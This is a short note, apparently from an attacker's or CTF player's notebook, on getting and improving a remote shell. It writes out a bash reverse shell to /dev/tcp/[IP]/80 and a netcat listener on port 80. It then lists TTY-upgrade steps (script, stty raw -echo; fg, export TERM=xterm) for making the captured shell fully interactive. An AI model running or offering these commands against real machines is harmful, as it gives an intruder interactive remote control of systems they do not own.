
Interesting observation where a user upgraded the usability of their shell

```
`bash -c 'bash -i >& /dev/tcp/[IP]/80 0>&1'

nc -nvlp 80


script -qc /bin/bash /dev/null
[CTRL+Z]

stty raw -echo; fg
			reset xterm


echo $TERM

export TERM=xterm
```


auto